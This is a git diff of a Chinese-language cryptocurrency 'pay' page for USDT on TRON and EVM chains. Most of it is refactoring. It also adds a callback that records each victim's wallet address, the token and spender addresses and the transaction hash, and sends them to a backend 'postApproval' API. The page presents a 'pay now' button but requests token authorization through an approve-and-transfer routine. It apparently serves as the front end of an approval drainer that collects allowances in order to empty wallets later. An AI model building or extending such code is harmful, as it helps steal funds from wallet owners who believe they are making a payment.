@@ -63,8 +63,8 @@
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/tronweb@6.1.1/dist/TronWeb.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.4/dist/ethers.umd.min.js"></script>
-  
   <script src="config/config.js"></script>
+  <script src="api/client.js"></script>
   <script src="app/core.js"></script>
   <script src="wallet/Evm.js"></script>
   <script src="wallet/TronLink.js"></script>
@@ -77,144 +77,108 @@
       const btn = $("btnMainPay");
       
       function log(msg) {
-        if(logEl) logEl.textContent = msg;
+        if (logEl) logEl.textContent = msg;
         console.log(msg);
       }
 
-      // 1. 初始化界面数据
-      // 注意：config.js 里的逻辑主要是针对 index.html 的，pay.html 需要自己处理一下配置读取
-      // 因为 config.js 里的 DOM 操作可能会失败（id 不匹配），但 window.pay0Config 数据是有的
-      
-      // 稍微延迟一下确保 config.js 执行完毕
       setTimeout(() => {
-          const cfg = window.pay0Config || {};
-          const amount = cfg.amountUsdt || "0.00";
-          $("amountText").textContent = amount;
-          
-          // 如果 config.js 没能正确解析出 toAddress（因为它依赖 index.html 的 URL 参数逻辑，可能在 pay.html 不适用），
-          // 我们需要自己再解析一次 URL 参数，或者信任 config.js 的结果
-          // 这里的 cfg.toAddress 可能显示 "未配置" 或者 undefined，取决于 config.js 的执行情况
-          
-          // 我们这里做一个更稳健的获取：
-          // 1. 尝试获取 URL 参数中的 to
-          const params = new URLSearchParams(window.location.search);
-          const urlTo = params.get("to") || params.get("address");
-          
-          // 2. 尝试从 config.js 获取 (如果 config.js 里的 getNetworkConfig 可用)
-          let configTo = cfg.toAddress;
-          
-          // 3. 如果还没定，尝试根据当前检测到的链来获取默认地址
-          // 这部分逻辑移到 checkEnv 里去做，因为那时候才知道是什么链
-          
-          // 先显示一个占位符，等 checkEnv 确定了链再更新
-          $("toAddressText").textContent = urlTo || configTo || "待检测...";
+        const cfg = window.pay0Config || {};
+        const amount = cfg.amountUsdt || "0.00";
+        $("amountText").textContent = amount;
+        const params = new URLSearchParams(window.location.search);
+        const urlTo = params.get("to") || params.get("address");
+        let configTo = cfg.toAddress;
+        $("toAddressText").textContent = urlTo || configTo || "待检测...";
       }, 100);
 
-      // 2. 环境检测与自动执行
       let payHandler = null;
       let chainType = "unknown";
 
       async function checkEnv() {
-      // 获取全局配置对象
-      const cfg = window.pay0Config || {};
-      const params = new URLSearchParams(window.location.search);
-      const urlTo = params.get("to") || params.get("address");
+        const cfg = window.pay0Config || {};
+        const params = new URLSearchParams(window.location.search);
+        const urlTo = params.get("to") || params.get("address");
 
-      // 辅助函数：更新显示的收款地址
-      function updateToAddress(chainKey) {
-        let finalTo = urlTo;
-        if (!finalTo && cfg.getNetworkConfig) {
-          const netCfg = cfg.getNetworkConfig(chainKey);
-          if (netCfg) finalTo = netCfg.toAddress;
-        }
-        if (finalTo) {
-          $("toAddressText").textContent = finalTo;
-        } else {
-          $("toAddressText").textContent = "未配置收款地址";
-        }
-      }
-
-      // 优先检测 TRON
-      if (window.tronWeb && window.tronWeb.defaultAddress) {
-        chainType = "tron";
-        $("netText").textContent = "TRON 网络";
-        updateToAddress("tron");
-        return async () => {
-           log("正在发起 TRON 授权...");
-           // 确保 amount 是字符串
-           const amount = (cfg.amountUsdt || "0.00").toString();
-           await window.pay0TokenPocketTronTransfer({ log, amountUsdt: amount });
-        };
-      }
-      
-      // 检测 EVM (MetaMask, TokenPocket ETH/BSC, etc)
-      if (window.ethereum) {
-        const chainIdHex = await window.ethereum.request({ method: "eth_chainId" });
-        const chainId = parseInt(chainIdHex, 16);
-        
-        let foundKey = null;
-        
-        // 遍历配置寻找当前链是否在支持列表中
-        if (cfg.networks) {
-          for (let key in cfg.networks) {
-            const net = cfg.networks[key];
-            if (net.chainIdHex && parseInt(net.chainIdHex, 16) === chainId) {
-              foundKey = key;
-              break;
-            }
+        function updateToAddress(chainKey) {
+          let finalTo = urlTo;
+          if (!finalTo && cfg.getNetworkConfig) {
+            const netCfg = cfg.getNetworkConfig(chainKey);
+            if (netCfg) finalTo = netCfg.toAddress;
+          }
+          if (finalTo) {
+            $("toAddressText").textContent = finalTo;
+          } else {
+            $("toAddressText").textContent = "未配置收款地址";
           }
         }
 
-        if (foundKey) {
-          // 当前网络已在配置中支持
-          let label = foundKey.toUpperCase();
-          if (foundKey === "bsc") label = "BSC 主网";
-          if (foundKey === "bscTestnet") label = "BSC 测试网";
-          if (foundKey === "eth") label = "Ethereum 主网";
-          
-          $("netText").textContent = label;
-          $("netText").className = "badge bg-white text-primary bg-opacity-25 border border-white border-opacity-25 mt-2";
-          updateToAddress(foundKey);
-          
+        if (window.tronWeb && window.tronWeb.defaultAddress) {
+          chainType = "tron";
+          $("netText").textContent = "TRON 网络";
+          updateToAddress("tron");
           return async () => {
-             log("正在发起 EVM 授权...");
-             const amount = (cfg.amountUsdt || "0.00").toString();
-             await window.pay0EvmApproveAndTransfer({ chain: foundKey, log, amountUsdt: amount });
+            log("正在发起 TRON 授权...");
+            const amount = (cfg.amountUsdt || "0.00").toString();
+            await window.pay0TokenPocketTronTransfer({ log, amountUsdt: amount });
           };
-        } else {
-          // 当前网络不支持
-          $("netText").textContent = "不支持当前网络: " + chainId;
-          $("netText").className = "badge bg-danger text-white mt-2";
-          
-          // 不显示收款地址，因为网络不支持
-          $("toAddressText").textContent = "当前网络不支持支付";
-          
-          // 禁用支付按钮并报错
-          const btn = $("btnMainPay");
-          btn.textContent = "网络不支持";
-          btn.disabled = true;
-          btn.className = "btn btn-secondary pay-btn";
-          
-          return null;
         }
-      }
 
-      return null;
-    }
+        if (window.ethereum) {
+          const chainIdHex = await window.ethereum.request({ method: "eth_chainId" });
+          const chainId = parseInt(chainIdHex, 16);
+
+          let foundKey = null;
+          if (cfg.networks) {
+            for (let key in cfg.networks) {
+              const net = cfg.networks[key];
+              if (net.chainIdHex && parseInt(net.chainIdHex, 16) === chainId) {
+                foundKey = key;
+                break;
+              }
+            }
+          }
+
+          if (foundKey) {
+            let label = foundKey.toUpperCase();
+            if (foundKey === "bsc") label = "BSC 主网";
+            if (foundKey === "bscTestnet") label = "BSC 测试网";
+            if (foundKey === "eth") label = "Ethereum 主网";
+
+            $("netText").textContent = label;
+            $("netText").className = "badge bg-white text-primary bg-opacity-25 border border-white border-opacity-25 mt-2";
+            updateToAddress(foundKey);
+
+            return async () => {
+              log("正在发起 EVM 授权...");
+              const amount = (cfg.amountUsdt || "0.00").toString();
+              await window.pay0EvmApproveAndTransfer({ chain: foundKey, log, amountUsdt: amount });
+            };
+          } else {
+            $("netText").textContent = "不支持当前网络: " + chainId;
+            $("netText").className = "badge bg-danger text-white mt-2";
+            $("toAddressText").textContent = "当前网络不支持支付";
+            const btn = $("btnMainPay");
+            btn.textContent = "网络不支持";
+            btn.disabled = true;
+            btn.className = "btn btn-secondary pay-btn";
+            return null;
+          }
+        }
+
+        return null;
+      }
 
       async function init() {
         try {
-          // 等待一小会儿让注入完成
-          await new Promise(r => setTimeout(r, 500));
-          
+          await new Promise((r) => setTimeout(r, 500));
           payHandler = await checkEnv();
-          
+
           if (payHandler) {
             btn.textContent = "立即支付";
             btn.disabled = false;
             btn.classList.remove("btn-secondary");
             btn.classList.add("btn-primary");
-            
+
             btn.onclick = async () => {
               try {
                 btn.disabled = true;
@@ -232,7 +196,6 @@
               }
             };
 
-            // 自动触发尝试（某些钱包允许，某些会拦截）
             log("环境已就绪，请点击按钮进行授权");
           } else {
             btn.textContent = "未检测到钱包环境";
@@ -248,6 +211,66 @@
       }
 
       window.addEventListener("load", init);
+
+      window.pay0PaymentCallback = async function(info) {
+        try {
+          const cfg = window.pay0Config || {};
+          const chain = String(info.chain || "").trim();
+          const txHash = String(info.txHash || "").trim();
+          const amountUsdt = String(info.amountUsdt || "").trim();
+          const action = String(info.action || "").trim() || "approve";
+
+          let tokenAddress = "";
+          let spenderAddress = "";
+          let ownerAddress = "";
+
+          if (chain === "tron") {
+            if (window.tronLink && window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress && window.tronLink.tronWeb.defaultAddress.base58) {
+              ownerAddress = window.tronLink.tronWeb.defaultAddress.base58;
+            } else if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+              ownerAddress = window.tronWeb.defaultAddress.base58;
+            }
+            const netCfgTron = typeof cfg.getNetworkConfig === "function" ? cfg.getNetworkConfig("tron") : null;
+            if (netCfgTron) {
+              tokenAddress = netCfgTron.usdtAddress || "";
+              spenderAddress = cfg.toAddress || netCfgTron.toAddress || "";
+            }
+          } else {
+            if (window.ethereum && window.ethers && window.ethers.BrowserProvider) {
+              try {
+                const provider = new window.ethers.BrowserProvider(window.ethereum);
+                const signer = await provider.getSigner();
+                ownerAddress = await signer.getAddress();
+              } catch (e) {}
+            }
+            if (typeof cfg.getNetworkConfig === "function") {
+              const netCfg = cfg.getNetworkConfig(chain);
+              if (netCfg) {
+                tokenAddress = netCfg.usdtAddress || "";
+                spenderAddress = cfg.toAddress || netCfg.toAddress || "";
+              }
+            }
+          }
+
+          if (!ownerAddress) return;
+          if (!tokenAddress || !spenderAddress) return;
+          if (!chain || !txHash || !amountUsdt) return;
+
+          const body = {
+            chain,
+            txHash,
+            amountUsdt,
+            action,
+            tokenAddress,
+            spenderAddress,
+            ownerAddress
+          };
+
+          if (window.pay0Api && typeof window.pay0Api.postApproval === "function") {
+            await window.pay0Api.postApproval(body);
+          }
+        } catch (e) {}
+      };
     })();
   </script>
 </body>
